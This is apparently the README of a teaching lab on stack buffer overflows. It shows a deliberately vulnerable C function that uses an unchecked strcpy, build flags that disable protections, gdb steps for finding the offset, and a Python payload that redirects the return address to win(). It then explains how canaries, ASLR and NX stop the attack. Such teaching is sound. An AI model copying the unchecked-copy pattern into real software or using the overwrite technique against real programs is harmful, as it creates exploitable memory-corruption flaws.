# 04-buffer-overflow

A deliberately vulnerable C program for studying a stack-based buffer overflow end to end: see the bug, find the offset, hijack control flow, then turn the mitigations back on and watch each one break a different step. **Educational only.**

## The bug

`vuln.c` has a 16-byte buffer and a `strcpy()` with no length check:

```c
void vulnerable(const char *input) {
    char buf[16];
    strcpy(buf, input);   /* copies the whole input, however long it is */
    printf("stored: %s\n", buf);
}
```

There is also a `win()` function that normal execution never calls. The exploit makes the program run it anyway.

## Build it (protections off)

```bash
gcc -std=c99 -g -fno-stack-protector -no-pie 04-buffer-overflow/vuln.c -o /tmp/vuln
```

These options disable the stack protector and PIE for this build where supported.
Addresses and mitigation behavior depend on the platform and build; inspect the
actual binary and runtime rather than assuming an address is fixed.

## Find the offset

One possible x86-64 frame, from low address to high, is:

```
buf[16] | saved rbp (8) | return address (8)
```

In that particular layout, the buffer-to-return-address distance is 24 bytes.
Compiler choices, architecture, alignment and protections can change the layout
and offset. Determine the offset for the build being examined. A 16-byte buffer
holds at most 15 characters plus the terminating NUL; 16 characters require 17
bytes and already overflow. The following inputs illustrate lengths, not
guaranteed outcomes:

```bash
/tmp/vuln AAAAAAAAAAAAAAA                 # 15 characters + NUL fit in buf
/tmp/vuln AAAAAAAAAAAAAAAA                # 16 characters + NUL overflow buf
/tmp/vuln $(python3 -c 'print("A"*24)')   # 24 characters + NUL
/tmp/vuln $(python3 -c 'print("A"*32)')   # 32 characters + NUL
```

Under gdb you can see it directly:

```bash
gdb /tmp/vuln
(gdb) break vulnerable
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
(gdb) x/8gx $rsp        # inspect the frame for this build
(gdb) info frame
```

## Hijack control flow

`main()` prints `win()`'s address. For a build verified to have a 24-byte offset
and a little-endian 64-bit address, the following illustrates the payload shape.
Replace the offset and address with values measured for that build. Command-line
arguments cannot contain embedded NUL bytes, so an address containing one cannot
be passed intact this way:

```bash
/tmp/vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + (0xADDR).to_bytes(8,"little"))')
```

If the overwrite reaches the return address intact and mitigations do not stop it,
the return can transfer control to `win()`.

## Turn the mitigations back on

Each one defeats a different step of what you just did:

- **Stack canary** (`-fstack-protector-all`) puts a guard value between the buffer and the return address. The overflow changes it, and the check before `ret` aborts the program *before* the overwritten return address is ever used. Detection.
- **ASLR / PIE** (drop `-no-pie`, leave system ASLR on) randomizes addresses every run, so the hardcoded `win()` target stops working — the crash address is different each time. Hiding the target.
- **NX** (non-executable stack, on by default) marks the stack non-executable, so the inject-shellcode-into-the-buffer variant never runs. Blocking injected code.

Real systems stack all three. This demo strips them off precisely so you can see what each one was protecting.
